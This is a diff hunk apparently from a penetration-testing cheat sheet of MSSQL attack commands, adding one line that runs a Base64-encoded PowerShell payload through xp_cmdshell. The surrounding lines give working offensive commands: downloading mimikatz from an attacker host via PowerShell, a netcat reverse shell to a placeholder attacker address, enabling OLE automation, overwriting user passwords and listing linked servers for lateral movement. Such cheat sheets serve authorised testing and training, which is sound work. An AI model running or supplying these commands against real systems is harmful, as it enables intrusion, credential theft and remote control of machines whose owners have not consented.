@@ -137,6 +137,7 @@ MSSQL # 3:EXEC xp_cmdshell 'whoami'; # Test command execution. If successful, yo
 MSSQL # 3:EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://<kali>:1234/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'; # Download binary via PowerShell; target-machine
 MSSQL # 3:EXEC xp_cmdshell 'C:\Windows\Temp\nc64.exe <kali> <kaliPort> -e cmd.exe'; # Reverse shell; kali-machine
 MSSQL # 3:EXEC xp_cmdshell 'powershell -e <base64>'; # Execute encoded PowerShell; kali-machine
+MSSQL # 3:EXEC xp_cmdshell 'powershell -EncodedCommand <base64>'; #execute Base64-encoded PowerShell payload through MSSQL xp_cmdshell after command execution is enabled; kali-machine
 MSSQL # 3:EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; # Enable OLE automation for file operations; kali-machine
 MSSQL # 4:update users set password='<password>' where username='<user>'; # Overwrite user password if you have write access; kali-machine
 MSSQL # 4:EXEC sp_linkedservers; # List linked servers for lateral movement; kali-machine
